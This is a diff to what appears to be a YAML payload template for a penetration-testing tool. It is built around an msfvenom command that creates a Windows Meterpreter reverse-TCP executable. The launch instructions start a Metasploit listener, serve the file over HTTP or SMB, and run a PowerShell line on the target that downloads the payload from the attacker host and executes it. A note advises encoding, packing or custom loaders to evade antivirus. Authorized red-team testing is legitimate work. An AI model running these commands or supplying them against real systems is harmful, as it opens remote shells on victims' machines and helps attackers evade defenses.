@@ -52,21 +52,34 @@ preprocessing: []
 output:
   type: "command"
   command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f exe -o {{ output_path }}/{{ output_file }}"
-
   launch_instructions: |
-    Step 1: Start Metasploit listener
-    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
+    Basic MSFVenom Payload - Launch Instructions
 
-    Step 2: Transfer payload to target
-    Option A: HTTP server
+    Start Listener:
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+
+    Transfer and Execute:
     python3 -m http.server 8000
-    Then on target: powershell -c "IWR -Uri http://{{ lhost }}:8000/{{ output_file }} -OutFile {{ output_file }}"
+    On target: powershell -c "IWR -Uri http://{{ lhost }}:8000/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
 
-    Option B: SMB share
+    Alternative (SMB):
     impacket-smbserver share . -smb2support
-    Then on target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }}
+    On target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && {{ output_file }}
 
-    Step 3: Execute on target
-    {{ output_file }}
+    Notes:
+    - Staged payload: Requires network connectivity to {{ lhost }}:{{ lport }} to download full Meterpreter DLL
+    - EXITFUNC=thread ensures clean exit without crashing process
+    - Windows Defender and most AV will detect this immediately (unobfuscated msfvenom payload)
+    - Consider encoding, packing, or custom loaders for real engagements
+    - Session should appear in msfconsole: "Meterpreter session X opened"
 
-    Note: This is a staged payload - requires network connectivity to download full Meterpreter
+    Troubleshooting:
+    - No connection: Check firewall rules on attacker machine (allow {{ lport }}/tcp)
+    - Connection drops immediately: AV likely killed the process
+    - "Connection refused": Listener not running or wrong LHOST/LPORT
+    - Payload won't execute: Windows SmartScreen or AV blocking execution
+
+    Cleanup:
+    On target:
+    taskkill /F /IM {{ output_file }} 2>nul
+    del {{ output_file }}
